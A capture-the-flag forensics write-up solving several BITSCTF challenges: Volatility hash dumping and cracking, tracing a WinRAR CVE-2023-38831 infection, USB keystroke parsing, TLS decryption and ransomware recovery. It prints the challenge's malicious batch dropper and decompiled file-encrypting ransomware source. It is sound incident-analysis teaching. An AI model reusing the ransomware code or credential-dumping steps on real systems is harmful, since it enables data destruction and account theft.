# Access Granted

**Flag:** `BITSCTF{adolfhitlerrulesallthepeople}`

We're told to extract a password from the memdump first. I first tried to use vol2 on the dump, but it failed and I was forced to use vol3.

I looked around for how to dump passwords in vol3 and found out we use the `windows.hashdump` command. Using it, we successfully get the hashes of MogamBro.

```
~/Downloads $ python3 volatility3/vol.py -f ~/Projects/Cryptonite/T*/F*\ -\ June\ */C*/F*/m*/memdump.mem windows.hashdump
Volatility 3 Framework 2.7.1
Progress:  100.00               PDB scanning finished
User    rid     lmhash  nthash

Administrator   500     aad3b435b51404eeaad3b435b51404ee        8a320467c7c22e321c3173e757194bb3
Guest   501     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0
DefaultAccount  503     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0
WDAGUtilityAccount      504     aad3b435b51404eeaad3b435b51404ee        74d0db3c3f38778476a44ff9ce0aefe2
MogamBro        1000    aad3b435b51404eeaad3b435b51404ee        8a320467c7c22e321c3173e757194bb3
```

We have the nthash and the lmhash. Dumping them both into a hash decryption website like CrackStation, we get the password as `adolfhitlerrulesallthepeople`.

![password](../../../../Images/1717068448663540153.png)

# 0.69 Day

**Flag:** `BITSCTF{CVE-2023-38831}`

We list all the processes MogamBro is running through `pstree`. Filtering out garbage processes like `svchost.exe` we find the system running apps of interest like `chrome.exe`, `WinRAR.exe` and `SkypeApp.exe`

```
~/Downloads $ python3 revfor/volatility3/vol.py -f ~/Projects/Cryptonite/T*/F*\ -\ June\ */C*/F*/m*/memdump.mem windows.pstree > tree
```

```
Volatility 3 Framework 2.7.1

PID	PPID	ImageFileName	Offset(V)	Threads	Handles	SessionId	Wow64	CreateTime	ExitTime	Audit	Cmd	Path

4	0	System	0xb606bf49a040	143	-	N/A	False	2024-02-15 16:09:58.000000 	N/A	-	-	-
* 356	4	smss.exe	0xb606c319d040	2	-	N/A	False	2024-02-15 16:09:58.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\smss.exe	-	-
* 2012	4	MemCompression	0xb606c6440080	58	-	N/A	False	2024-02-15 16:10:03.000000 	N/A	MemCompression	-	-
* 108	4	Registry	0xb606bf5b5040	4	-	N/A	False	2024-02-15 16:09:57.000000 	N/A	Registry	-	-
456	444	csrss.exe	0xb606c507e0c0	11	-	0	False	2024-02-15 16:10:02.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\csrss.exe	%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16	C:\Windows\system32\csrss.exe
532	444	wininit.exe	0xb606c583a080	1	-	0	False	2024-02-15 16:10:02.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\wininit.exe	wininit.exe	C:\Windows\system32\wininit.exe
* 696	532	lsass.exe	0xb606c5881080	13	-	0	False	2024-02-15 16:10:02.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\lsass.exe	C:\Windows\system32\lsass.exe	C:\Windows\system32\lsass.exe
* 840	532	fontdrvhost.ex	0xb606c605a180	5	-	0	False	2024-02-15 16:10:03.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\fontdrvhost.exe	-	-
* 676	532	services.exe	0xb606c583d140	8	-	0	False	2024-02-15 16:10:02.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\services.exe	C:\Windows\system32\services.exe	C:\Windows\system32\services.exe
** 1792	676	VBoxService.ex	0xb606c6487280	11	-	0	False	2024-02-15 16:10:03.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\VBoxService.exe	C:\Windows\System32\VBoxService.exe	C:\Windows\System32\VBoxService.exe
** 6924	676	SecurityHealth	0xb606c7768280	9	-	0	False	2024-02-15 16:10:20.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\SecurityHealthService.exe	C:\Windows\system32\SecurityHealthService.exe	C:\Windows\system32\SecurityHealthService.exe
*** 8872	2320	audiodg.exe	0xb606c7b1c080	7	-	0	False	2024-02-15 16:36:41.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\audiodg.exe	C:\Windows\system32\AUDIODG.EXE 0x528	C:\Windows\system32\AUDIODG.EXE
** 548	676	SgrmBroker.exe	0xb606c84de080	8	-	0	False	2024-02-15 16:12:04.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\SgrmBroker.exe	C:\Windows\system32\SgrmBroker.exe	C:\Windows\system32\SgrmBroker.exe
*** 2340	816	HxTsr.exe	0xb606c7b90080	13	-	1	False	2024-02-15 16:31:02.000000 	N/A	\Device\HarddiskVolume1\Program Files\WindowsApps\microsoft.windowscommunicationsapps_16005.11629.20316.0_x64__8wekyb3d8bbwe\HxTsr.exe	"C:\Program Files\WindowsApps\microsoft.windowscommunicationsapps_16005.11629.20316.0_x64__8wekyb3d8bbwe\HxTsr.exe" -ServerName:Hx.IPC.Server	C:\Program Files\WindowsApps\microsoft.windowscommunicationsapps_16005.11629.20316.0_x64__8wekyb3d8bbwe\HxTsr.exe
*** 4400	4316	ctfmon.exe	0xb606c6ee4280	9	-	1	False	2024-02-15 16:10:08.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\ctfmon.exe	"ctfmon.exe"	C:\Windows\system32\ctfmon.exe
** 2664	676	spoolsv.exe	0xb606c6719240	7	-	0	False	2024-02-15 16:10:04.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\spoolsv.exe	C:\Windows\System32\spoolsv.exe	C:\Windows\System32\spoolsv.exe
** 2928	676	MsMpEng.exe	0xb606c67e2280	8	-	0	False	2024-02-15 16:10:04.000000 	N/A	\Device\HarddiskVolume1\Program Files\Windows Defender\MsMpEng.exe	"C:\Program Files\Windows Defender\MsMpEng.exe"	C:\Program Files\Windows Defender\MsMpEng.exe
540	524	csrss.exe	0xb606c583f140	14	-	1	False	2024-02-15 16:10:02.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\csrss.exe	%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16	C:\Windows\system32\csrss.exe
604	524	winlogon.exe	0xb606c585f080	5	-	1	False	2024-02-15 16:10:02.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\winlogon.exe	winlogon.exe	C:\Windows\system32\winlogon.exe
* 848	604	fontdrvhost.ex	0xb606c6058180	5	-	1	False	2024-02-15 16:10:03.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\fontdrvhost.exe	-	-
* 4268	604	userinit.exe	0xb606c6e70080	0	-	1	False	2024-02-15 16:10:07.000000 	2024-02-15 16:10:27.000000 	\Device\HarddiskVolume1\Windows\System32\userinit.exe	-	-
** 4352	4268	explorer.exe	0xb606c6e76340	83	-	1	False	2024-02-15 16:10:07.000000 	N/A	\Device\HarddiskVolume1\Windows\explorer.exe	C:\Windows\Explorer.EXE	C:\Windows\Explorer.EXE
*** 7044	4352	VBoxTray.exe	0xb606c7642080	11	-	1	False	2024-02-15 16:10:21.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\VBoxTray.exe	"C:\Windows\System32\VBoxTray.exe" 	C:\Windows\System32\VBoxTray.exe
*** 6884	4352	SecurityHealth	0xb606c727a080	1	-	1	False	2024-02-15 16:10:20.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\SecurityHealthSystray.exe	"C:\Windows\System32\SecurityHealthSystray.exe" 	C:\Windows\System32\SecurityHealthSystray.exe
*** 7120	4352	OneDrive.exe	0xb606c778e240	26	-	1	True	2024-02-15 16:10:21.000000 	N/A	\Device\HarddiskVolume1\Users\MogamBro\AppData\Local\Microsoft\OneDrive\OneDrive.exe	"C:\Users\MogamBro\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background	C:\Users\MogamBro\AppData\Local\Microsoft\OneDrive\OneDrive.exe
*** 9840	4352	FTK Imager.exe	0xb606c828f080	23	-	1	False	2024-02-15 16:36:43.000000 	N/A	\Device\HarddiskVolume1\Program Files\AccessData\FTK Imager\FTK Imager.exe	"C:\Program Files\AccessData\FTK Imager\FTK Imager.exe" 	C:\Program Files\AccessData\FTK Imager\FTK Imager.exe
*** 8436	4352	WinRAR.exe	0xb606c7a17080	5	-	1	False	2024-02-15 16:33:04.000000 	N/A	\Device\HarddiskVolume1\Program Files\WinRAR\WinRAR.exe	"C:\Program Files\WinRAR\WinRAR.exe" "C:\Users\MogamBro\Downloads\Follow-these-instructions.zip"	C:\Program Files\WinRAR\WinRAR.exe
* 404	604	dwm.exe	0xb606c616c080	19	-	1	False	2024-02-15 16:10:03.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\dwm.exe	"dwm.exe"	C:\Windows\system32\dwm.exe
4864	4900	GoogleCrashHan	0xb606c830d080	3	-	0	True	2024-02-15 16:12:06.000000 	N/A	\Device\HarddiskVolume1\Program Files (x86)\Google\Update\1.3.36.372\GoogleCrashHandler.exe	-	-
7632	4900	GoogleCrashHan	0xb606c85e4080	3	-	0	False	2024-02-15 16:12:06.000000 	N/A	\Device\HarddiskVolume1\Program Files (x86)\Google\Update\1.3.36.372\GoogleCrashHandler64.exe	-	-
7580	7896	chrome.exe	0xb606bfe05080	0	-	1	False	2024-02-15 16:12:07.000000 	2024-02-15 16:12:58.000000 	\Device\HarddiskVolume1\Program Files\Google\Chrome\Application\chrome.exe	-	-
6624	8812	msedge.exe	0xb606c776f300	0	-	1	False	2024-02-15 16:12:32.000000 	2024-02-15 16:12:32.000000 	\Device\HarddiskVolume1\Program Files (x86)\Microsoft\Edge\Application\msedge.exe	-	-
1468	7352	cmd.exe	0xb606c7de1080	1	-	1	False	2024-02-15 16:33:09.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\cmd.exe	C:\Windows\system32\cmd.exe  /K "C:\Users\MogamBro\AppData\Local\Temp\Rar$DIa8436.27164\steps.pdf .bat"   	C:\Windows\system32\cmd.exe
* 3724	1468	notepad.exe	0xb606c70a6080	1	-	1	False	2024-02-15 16:33:10.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\notepad.exe	notepad.exe  secret.png.enc 	C:\Windows\system32\notepad.exe
* 8652	1468	chrome.exe	0xb606c8115080	0	-	1	False	2024-02-15 16:33:10.000000 	2024-02-15 16:33:50.000000 	\Device\HarddiskVolume1\Program Files\Google\Chrome\Application\chrome.exe	-	-
* 780	1468	conhost.exe	0xb606c8905080	3	-	1	False	2024-02-15 16:33:09.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\conhost.exe	\??\C:\Windows\system32\conhost.exe 0x4	C:\Windows\system32\conhost.exe
```

Opening the `.ad1` file with FTKImager and exporting the data in its Downloads folder, we can see what looks to be a malicious batch script running.

```
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
@echo off
lottery.exe & start chrome -incognito https://pastebin.com/mPvzn0AD & notepad.exe secret.png.enc & curl google.com -o steps.pdf & steps.pdf
exit
```

I also run the `cmdline` command on it.

```
~/Downloads/revfor $ python3 volatility3/vol.py -f ~/Projects/Cryptonite/T*/F*\ -\ June\ */C*/F*/m*/memdump.mem windows.cmdline.CmdLine > CMD
.
.
.
8436	WinRAR.exe	"C:\Program Files\WinRAR\WinRAR.exe" "C:\Users\MogamBro\Downloads\Follow-these-instructions.zip"
1468	cmd.exe	C:\Windows\system32\cmd.exe  /K "C:\Users\MogamBro\AppData\Local\Temp\Rar$DIa8436.27164\steps.pdf .bat"
780	conhost.exe	\??\C:\Windows\system32\conhost.exe 0x4
8652	chrome.exe	Required memory at 0xb149572020 is not valid (process exited?)
3724	notepad.exe	notepad.exe  secret.png.enc
```

At this point I think the vulnerable program is either WinRAR or Notepad. I extracted both their files using `dumpfile` to look at their binaries.

**Notepad**

```
~/Downloads/revfor $ python3 volatility3/vol.py -f ~/Projects/Cryptonite/T*/F*\ -\ June\ */C*/F*/m*/memdump.mem dumpfile --pid 3724 --virtaddr 0xb606ca106830
```

**WinRAR**

```
~/Downloads/revfor $ python3 volatility3/vol.py -f ~/Projects/Cryptonite/T*/F*\ -\ June\ */C*/F*/m*/memdump.mem dumpfile --pid 8436 --virtaddr 0xb606c737e580
```

Unfortunately, I tried running them both using `wine` and neither worked. So I now had to dig for relevant CVE's myelf.

I first started searching WinRAR CVE's to find a relevant vulnerability. Searching for exploits related to zip files and batch scripts, I was lead to [this blog post](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/exploring-winrar-vulnerability-cve-2023-38831/) by McAfee. It matched our threat model exactly, such as the file names of the pdf and zip being the same. Hence, we get the required CVE as `CVE-2023-38831`, and thus the flag.


# MogamBro's Guilty Pleasure

**Flag:** `BITSCTF{sp4m_2_ph1sh_U}`

We find two `.eml` Email files in the **Documents/Outlook** folder when opening the `ad1` file with FTKImager. In the first file `50% Discount available on the Mimikyu plushie.eml`, we find data that looks to be encoded by Spam Mimic. And sure enough, decoding it, we get the flag.

```
Dear Friend , We know you are interested in receiving
red-hot information . We will comply with all removal
requests . This mail is being sent in compliance with
Senate bill 1622 , Title 9 ; Section 305 . THIS IS
NOT MULTI-LEVEL MARKETING ! Why work for somebody else
when you can become rich as few as 24 weeks ! Have
you ever noticed nearly every commercial on television
has a .com on in it plus nearly every commercial on
television has a .com on in it ! Well, now is your
chance to capitalize on this ! WE will help YOU deliver
goods right to the customer's doorstep and deliver
goods right to the customer's doorstep ! You can begin
at absolutely no cost to you . But don't believe us
! Mrs Jones of New Mexico tried us and says "I've been
poor and I've been rich - rich is better" ! We are
licensed to operate in all states . We IMPLORE you
- act now ! Sign up a friend and you get half off !
Thanks . Dear Salaryman ; Your email address has been
submitted to us indicating your interest in our letter
. If you no longer wish to receive our publications
simply reply with a Subject: of "REMOVE" and you will
immediately be removed from our mailing list . This
mail is being sent in compliance with Senate bill 1627
, Title 6 , Section 303 . This is not multi-level marketing
. Why work for somebody else when you can become rich
as few as 70 WEEKS ! Have you ever noticed people love
convenience and most everyone has a cellphone ! Well,
now is your chance to capitalize on this . WE will
help YOU process your orders within seconds plus turn
your business into an E-BUSINESS . You are guaranteed
to succeed because we take all the risk . But don't
believe us ! Prof Ames of Louisiana tried us and says
"I've been poor and I've been rich - rich is better"
! We are licensed to operate in all states . Do not
delay - order today ! Sign up a friend and you'll get
a discount of 50% . Thank-you for your serious consideration
of our offer .
```

# I'm wired in

**Flag:** `BITSCTF{I_7h1nk_th3y_4Re_k3yl0991ng_ME!}`

We extract a pcap dump and an irrelevant text file that I thought would be useful using FTKImager. I looked around for how to parse USB pcap data and came across [this video](https://www.youtube.com/watch?v=EnOgRyio_9Q). After that it was a simple matter of following the steps shown, and I got the flag.

```
~/Downloads $ python3 ctf-usb-keyboard-parser/usbkeyboard.py keys
I havebeen hake !!!
HELMEE
BITSCTF{I_7h1nk_th3y_4Re_k3yl0991ng_ME!}

" MogamBro
```

# Bypassing Transport Layer

**Flag:** `BITSCTF{5te4l1ng_pr1v47e_key5_ez:)}`

For this, I remembered the keys file I had stupidly called "useless" earlier. We also have a pcap dump we've not accessed for any challenge, as this was the last DFIR I solved.

Looking around a bit, I found the an option in wireshark that let me import these keys into the pcap dump — `Edit → Preferences → Protocols → TLS → Browse Key file`.

Inserting the keys into wireshark, we decrypted the previously obscured data. Now, we exported all HTTP objects and got a ton of files.

I first tried the naive approach of running strings on all of them, and it worked!

```
…/Files/mogambro/bypass/files $ strings * | grep -i bitsctf
</div></li><li class="li1"><div class="de1">Anyways here&#039;s your flag - BITSCTF{5te4l1ng_pr1v47e_key5_ez:)}</div></li></ol>        </div>
```

# Lottery

**Flag:** `BITSCTF{1_r3c3ived_7he_b0mbz}`

Given is an executable which I found to be a PyInstaller file. I extracted the python code using [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor).

Upon extraction, we find the file we wanted— `lottery.pyc`. Using an online `.pyc` decompiler with the uncompyle6 engine, we get the following file.

```py
# uncompyle6 version 3.9.1
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.6.12 (default, Feb  9 2021, 09:19:15)
# [GCC 8.3.0]
# Embedded file name: lottery.py
import os, tempfile
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def generate_key():
    key = os.urandom(32)
    fp = tempfile.TemporaryFile(mode="w+b", delete=False)
    fp.write(key)
    return key


def encrypt_file(file_path, key):
    iv = b'urfuckedmogambro'
    with open(file_path, "rb") as file:
        data = file.read()
        padded_data = pad(data, AES.block_size)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted_data = cipher.encrypt(padded_data)
    file.close()
    encrypted_file_path = file_path + ".enc"
    with open(encrypted_file_path, "wb") as encrypted_file:
        encrypted_file.write(encrypted_data)
    os.remove(file_path)


if __name__ == "__main__":
    key = generate_key()
    file_path = "secret.png"
    encrypt_file(file_path, key)
    print("Dear MogamBro, we are fucking your laptop with a ransomware & your secret image is now encrypted! Send $69M to recover it!")
```

As we can see, it runs an AES block cipher on the encrypted PNG file using an IV `urfuckedmogambro` and a random key, and removes the original PNG file.

We also see that the key is stored in a temporary file as well. Poking around the `.ad1` filesystem we got, we find the key in `C:\Users\MogamBro\AppData\Local\Temp\tmpd1tif_2a`.

So we have the key, the code, and the encrypted file. We now reverse the AES decryptor and the flag.

```py
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def decrypt_file(encrypted_file_path, key):
    iv = b'urfuckedmogambro'
    with open(encrypted_file_path, "rb") as encrypted_file:
        encrypted_data = encrypted_file.read()
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_data = cipher.decrypt(encrypted_data)
        unpadded_data = unpad(decrypted_data, AES.block_size)
    decrypted_file_path = encrypted_file_path[:-4]  # Remove the ".enc" extension
    with open(decrypted_file_path, "wb") as decrypted_file:
        decrypted_file.write(unpadded_data)

if __name__ == "__main__":
    key_file_path = "tmpd1tif_2a"
    with open(key_file_path, "rb") as key_file:
        key = key_file.read()
    encrypted_file_path = "secret.png.enc"
    decrypt_file(encrypted_file_path, key)
    print("File decrypted successfully!")
```

![secret.png](../../../../Images/secret.png)
